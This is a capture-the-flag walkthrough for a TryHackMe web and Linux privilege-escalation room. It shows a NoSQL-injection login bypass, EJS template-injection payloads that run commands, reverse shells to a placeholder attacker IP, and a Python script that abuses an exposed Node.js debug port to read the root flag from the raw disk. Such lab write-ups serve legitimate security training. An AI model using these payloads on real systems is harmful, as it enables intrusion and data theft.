# Do Not Disturb Walkthrough
<br/>

## Intro
Welcome to the Do not Disturb challenge, here is the link to the [room](https://tryhackme.com/room/hh-donotdisturb-84a45644) on TryHackMe.

This is a medium level challege about web-exploitation to gain initial access and Linux privilege escalation.

"*Sign's on the door. Room's active. You have access you were never given, and so does he.
The anomalies stop being anomalies: a session goes warm on a sunbed, and a stranger sits down in it, a wallet signs a transaction its owner didn't authorise, a shell on the beach answers back. And it becomes clear that whoever's already inside has been moving for far longer than you have.
The Byte Lotus poolside platform tracks every cabana, every sunbed, every warm session. Byte Lotus never forgets. Someone is already inside. Follow his footprints in, climb the way he climbed, and recover both flags.*"

Whenever you feel ready press on "start machine" and connect via OpenVPN or by using the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
We navigate to the website `http://MACHINE_IP` here we get redirected to `/login` where we need some credential to access the staff panel.

Looking ad the headers we can see `X-Powered-By: Express`, you could view the same info with an extension like *Wappalyzer* in your browser.

In the meantime we launch a directory scan:
```bash
 gobuster dir -u http://MACHINE_IP  -w /usr/share/SecLists/Discovery/Web-Content/common.txt
```

Which finds the `/staff` one, but going there we get a 403 -> "Staff access only."

Here beside that header there were not many hints, so i decided to try multiple approaches, one being brute forcing the login, but for some reason *Hydra* was confidently matching one set of credentials in rockyou that was invalid...
The other option was trying SQLi to bypass the login page, here the usual payload like `attendant' OR 1=1 -- -` failed in the username field, so i decided to "attack" the password one. 

If we can make it return true we might have a chance.
For this we capture the request and change the password field to `password[$ne]` and as value `=invalidstring`, that first string asks to evaluate if it is not-equal to my invalid string, since it is not equal (you can put there any weird string you are sure is not in the db) it evaluates `True`:
```http
POST /login HTTP/1.1
Host: 10.80.187.242
Content-Length: 46
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: http://10.80.187.242
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.80.187.242/login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=attendant&password[$ne]=invalidstring
```

And our intuition was right, we get a succesfull response and a redirection to `/staff` and a cookie called `connect.sid` get set.
If you we in BurpSuite an have edited the request and forwarded it you are set, disable the interception and go back into the browser. Otherwise if you used Repeatrer or other tools like *curl* or edited the request in the browser, you need to navigate to `/staff` manually, open devtools and create that cookie, finally paste its value and reload the page.

Now we ar in the staff page, signed as the "attendant" user, there is also a box where we can change the "confirmation template".

Since this allow us to directly modify a template, it really smell like a possible SSTI, let's test it out.

We already know that we are dealing with JavaScript from the `Express` header found previously (plus is clearly written "EJS" in the commend above the box), this narrows the payloads we need to test.

We need to follow this syntax: `<% PYALOAD_HERE %>`.
This succesfully shows us the files in the current directory:
```javascript
<%global.process.mainModule.require("Y:/A:/"+global.process.mainModule.require("child_process").execSync("ls").toString()) ""["x"][global.process.mainModule.require("child_process").execSync("id").toString()]%>
```

This confirms our hypotesis and we know have RCE.
Running the `id` command we understand we are the user "poolside", tecnically we could get the flag directly using *cat* to read the "user.txt"

<br/>

## User Flag
But first i want to get a reverse shell:
```javascript
<% global.process.mainModule.require('child_process').exec('/bin/bash -c "/bin/bash -i >& /dev/tcp/YOUR_IP/1234 0>&1"') %>
```

Another option with a "non one-liner":
```javascript
<% 
var net = global.process.mainModule.require("net");
var cp = global.process.mainModule.require("child_process");
var sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(1234, "YOUR_IP", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
});
%>
```

(The result is the same, just sharing different payloads)


Before sending it prepare a listener on your machine:
```bash
nc -lvnp 1234
```

Now that we have a shell let's first stabilize it and make it fully interactive, i made a guide [here](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/main/Tips-%26-Resources/Reverse_Shell-Upgrade.md) on how to do it.

Time for the first flag:
```bash
cat /home/poolside/user.txt
```

--> REDACTED

<br/>

## Privilege Escalation
Transfer linpeas from your machine to the target:
Attacker:
```bash
python3 -m http.server
```

Target:
```bash
wget http://YOUR_IP:8000/linpeas.sh
chmod +x linpeas.sh
```

Execute it:
```bash
./linpeas.sh > linpeas-report
```


We can see this interesting line:
```
pipelin+     596  0.0  2.5 1119128 50252 ?       Ssl  16:37   0:00 /usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

This is a thing worth investigating, the `--inspect` here could be dangerous (at least is only for localhost here, but since we have already access to the host thats good for us) as it tells the Node.js V8 engine to open a debugging port 9229 using the Chrome DevTools Protocol (CDP).

And the user runnin it is:
```
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

The "pipelinesvc" user is in the **`disk`** group, which is effectively equivalent to root because it grants raw read access to the hard drive block devices.

Try to interact with it:
```bash
curl -s http://127.0.0.1:9229/json
```

It answers:
```json
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only
=true&ws=127.0.0.1:9229/4780e8fd-5ebc-4134-8797-b6b92a60a90d",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=tr
ue&v8only=true&ws=127.0.0.1:9229/4780e8fd-5ebc-4134-8797-b6b92a60a90d",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "4780e8fd-5ebc-4134-8797-b6b92a60a90d",
  "title": "processor.js",
  "type": "node",
  "url": "file:///opt/pipelinesvc/telemetry/processor.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/4780e8fd-5ebc-4134-8797-b6b92a60a90d"
} ]

```

The id will be important for later, so let's save this output as we will be interacting with that service to escalate privileges.

Let's take a lookt at the processor.js:
```bash
cat /opt/pipelinesvc/telemetry/processor.js
```

It contains this script:
```js
'use strict';

const os = require('os');

let ticks = 0;

function processBatch() {
  ticks += 1;
  const load = os.loadavg()[0].toFixed(2);
  if (ticks % 12 === 0) {
    console.log(`[telemetry] ${new Date().toISOString()} batches=${ticks} load=${load}`);
  }
}

console.log('lotus-telemetry occupancy processor started');
setInterval(processBatch, 5000);

// Keep the event loop busy/alive indefinitely.
process.stdin.resume();
```

This script emits periodic telemetry logs with batch count and system load, runs every 5 seconds and it runs indefinitely unless stopped.
This specific code is not really relevant, it only keeps the debugging service running, which is needed but nothing more.

**To recap**: we use the Node.js Inspector to execute a script as `pipelinesvc`, and use `pipelinesvc`'s `disk` group privileges to read the root flag directly from the raw hard drive.

I have created this python script, save it as `script.py` on the target.
The script acts as a websocket to interact with the debugging port, here is the step by step:
1. Connect to port 9229 and upgrade the HTTP connection to websocket.
2. Sends a made up JavaScript payload via the Chrome DevTools Protocol (CDP).
	- it tells Node.js to spawn a shell (`child_process`) and execute a bash script.
3. The bash script uses `debugfs` or `grep` on the raw block device (`/dev/sda1` or `/dev/root`) to extract `/root/root.txt`, bypassing file permissions.
4. The bash script saves the output to `/tmp/o.txt`, and the Node.js process reads this file and sends the flag back to the Python script over the WebSocket.

We also use base64 encoding to avoid problems escaping some characters.

```python
import socket, base64, os, json, struct, subprocess, time

# --- Shell script (base64-encoded to avoid ALL escaping problems) ---
shell_script = """#!/bin/sh
OUT=/tmp/o.txt
id > $OUT 2>&1
echo "=== DF ===" >> $OUT
df -h / >> $OUT 2>&1
echo "=== LSBLK ===" >> $OUT
lsblk >> $OUT 2>&1
DEV=$(df / | tail -1 | awk '{print $1}')
echo "rootdev=$DEV" >> $OUT
echo "=== DEBUGFS ===" >> $OUT
command -v debugfs >> $OUT 2>&1
echo "=== FLAG ===" >> $OUT
FOUND=0
for d in "$DEV" /dev/root /dev/xvda1 /dev/nvme0n1p1 /dev/sda1; do
  R=$(timeout 8 debugfs -R 'cat /root/root.txt' "$d" 2>/dev/null)
  if [ -n "$R" ]; then
    echo "FROM:$d" >> $OUT
    echo "$R" >> $OUT
    FOUND=1
    break
  fi
done
if [ "$FOUND" = "0" ]; then
  echo "debugfs no luck, grepping $DEV" >> $OUT
  timeout 25 grep -a -m 1 -oE "[A-Za-z0-9_]*\\{[^\\}]{5,}\\}" "$DEV" >> $OUT 2>&1
fi
echo "=== END ===" >> $OUT
"""
b64 = base64.b64encode(shell_script.encode()).decode()

# --- Get fresh target ---
out = subprocess.check_output(['curl','-s','http://127.0.0.1:9229/json']).decode()
target = json.loads(out)[0]
path = target['webSocketDebuggerUrl'].split('9229')[1]
print(f"[+] Target: {target['title']} path: {path}")

# --- Connect + handshake ---
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9229))
key = base64.b64encode(os.urandom(16)).decode()
req = (f"GET {path} HTTP/1.1\r\nHost: 127.0.0.1:9229\r\nUpgrade: websocket\r\n"
       f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n")
s.sendall(req.encode())
buf = b''
while b'\r\n\r\n' not in buf:
    buf += s.recv(1024)
print("[+] Handshake:", buf.split(b'\r\n')[0].decode())

# --- WebSocket helpers ---
def send_ws(sock, payload):
    mask = os.urandom(4); data = payload.encode(); h = bytearray([0x81]); l = len(data)
    if l < 126: h.append(0x80 | l)
    elif l < 65536: h.append(0x80 | 126); h += struct.pack(">H", l)
    else: h.append(0x80 | 127); h += struct.pack(">Q", l)
    h += mask; h += bytearray([data[i] ^ mask[i % 4] for i in range(l)])
    sock.sendall(h)

def recv_exact(sock, n):
    d = b''
    while len(d) < n:
        c = sock.recv(n - len(d))
        if not c: break
        d += c
    return d

def recv_ws(sock):
    hd = recv_exact(sock, 2)
    if len(hd) < 2: return None
    masked = hd[1] & 0x80; l = hd[1] & 0x7F
    if l == 126: l = struct.unpack(">H", recv_exact(sock,2))[0]
    elif l == 127: l = struct.unpack(">Q", recv_exact(sock,8))[0]
    mk = recv_exact(sock,4) if masked else None
    p = recv_exact(sock, l)
    if mk: p = bytearray([p[i] ^ mk[i%4] for i in range(l)])
    return bytes(p).decode('utf-8', errors='replace')

# --- Payload: write script via base64, run it, return the output ---
cmd = ('(function(){var cp;'
       'try{cp=require("child_process")}catch(e){}'
       'if(!cp){try{cp=process.mainModule.require("child_process")}catch(e){}}'
       'if(!cp){try{cp=global.process.mainModule.require("child_process")}catch(e){}}'
       'if(!cp){try{cp=module.require("child_process")}catch(e){}}'
       'if(!cp){try{cp=globalThis.process.mainModule.require("child_process")}catch(e){}}'
       'if(!cp)return "FAILED_REQUIRE";'
       f'cp.execSync("echo {b64} | base64 -d > /tmp/r.sh; sh /tmp/r.sh");'
       'return "EXEC_DONE\\n" + cp.execSync("cat /tmp/o.txt").toString();'
       '})()')

send_ws(s, json.dumps({"id":1,"method":"Runtime.evaluate",
                       "params":{"expression":cmd,"returnByValue":True}}))
print("[+] Sent. Waiting (up to 90s)...")

s.settimeout(90)
try:
    while True:
        f = recv_ws(s)
        if f is None: break
        try:
            j = json.loads(f)
            if 'result' in j and 'result' in j['result'] and 'value' in j['result']['result']:
                print("\n[OUTPUT]\n" + j['result']['result']['value'])
            else:
                print("\n[RECV]", f)
        except Exception:
            print("\n[RECV]", f)
except socket.timeout:
    print("[!] timed out - but check the file anyway")
```

> [!Curiousity] **Expansion on the Script Building** <br>
> If you are curious, in the script, we have implmented our own light websocket and since the websocket protocol strictly requires clients to "mask" (XOR encrypt) their payloads before sending them to the server to prevent cache poisoning attacks. The `send_ws` function generates a 4-byte random mask and XORs the payload data.
> 
> We have also contsucted the raw binary headers (setting the `FIN` bit, text opcode `0x81`, and payload length) so the Node.js server understands the incoming data.
> 
> Because `processor.js` uses strict mode or specific module scopes, `require` might not be globally available, so we try multiple ways to import the `child_process` module (`process.mainModule.require`, `global.require`...) to ensure it can spawn shell commands.
> 
> Once `child_process` is acquired, run `execSync`, which decodes the base64 bash scriptm writes it to `/tmp/r.sh` and executes it.
>
> We save the output of the bash script to `/tmp/o.txt`.
>
>Then we use the CDP method `Runtime.evaluate`, tells the V8 JavaScript engine running inside `processor.js` to take our payload and execute it.
>
>Finally we parse the result and output the flag!

Run it:
```bash
  python3 script.py
```

And it prints us the root flag in the terminal:

--> REDACTED

<br/>
<br/>

Congratulations, you have successfully exploited an SQLi to bypass a login for, then leveraged a SSTI to gain a reverse shell into the target and finally exploited a misconfigured nodejs open debugging port to execute as an user who could read block devices and get the root flag!

Hope you had fun following along and completing the challenge.

Catch you in the next CTF 😃 
